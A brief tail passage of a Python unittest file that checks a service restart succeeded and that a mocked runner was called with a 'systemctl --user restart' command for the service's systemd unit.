            self.assertTrue(result["success"])
            mocked_run.assert_called_with(
                ["systemctl", "--user", "restart", service.identity["systemd_unit"]]
            )


if __name__ == "__main__":
    unittest.main()
